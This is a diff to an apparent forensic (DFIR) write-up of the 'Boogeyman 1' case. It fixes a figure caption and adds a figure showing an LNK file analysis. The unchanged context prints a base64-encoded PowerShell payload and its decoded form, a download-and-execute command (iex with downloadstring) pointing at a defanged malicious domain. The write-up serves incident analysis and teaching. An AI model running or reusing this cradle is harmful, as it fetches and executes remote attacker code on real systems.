@@ -67,7 +67,10 @@ DFIR Investigation: Case "Boogeyman 1"
            "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA=="
 
 ![Figure 3: LNK file analysis revealing encoded PowerShell payload in command line arguments](Screen1.3.png)
-Figure 1: LNK file analysis revealing encoded PowerShell payload in command line arguments
+Figure 3: LNK file analysis revealing encoded PowerShell payload in command line arguments
+
+![Figure 4: LNK file analysis revealing encoded PowerShell payload in command line arguments](Screen1.4.png)
+Figure 4: LNK file analysis revealing encoded PowerShell payload in command line arguments
   После декодирования была получена команда:
     iex (new-object net.webclient).downloadstring('http://files[.]bpakcaging.xyz/update')
   
